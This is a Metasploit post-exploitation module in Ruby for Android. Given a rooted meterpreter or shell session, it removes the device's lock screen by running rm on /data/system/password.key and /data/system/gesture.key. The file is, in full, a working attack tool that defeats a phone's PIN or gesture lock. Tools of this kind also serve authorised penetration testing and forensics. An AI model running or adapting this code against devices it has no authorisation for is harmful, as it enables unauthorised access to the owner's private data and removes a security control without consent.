##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::Common
  include Msf::Post::Android::Priv

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Android Root Remove Device Locks (root)',
        'Description' => %q{
          This module uses root privileges to remove the device lock.
          In some cases the original lock method will still be present but any key/gesture will
          unlock the device.
        },
        'Privileged' => true,
        'License' => MSF_LICENSE,
        'Author' => [ 'timwr' ],
        'SessionTypes' => [ 'meterpreter', 'shell' ],
        'Platform' => 'android',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [CONFIG_CHANGES, SCREEN_EFFECTS],
          'Reliability' => []
        }
      )
    )
  end

  def run
    fail_with(Failure::NoAccess, 'This module requires root permissions.') unless is_root?

    %w[
      /data/system/password.key
      /data/system/gesture.key
    ].each do |path|
      print_status("Removing #{path}")
      cmd_exec("rm #{path}")
    end

    print_status('Device should be unlocked or no longer require a pin')
  end
end
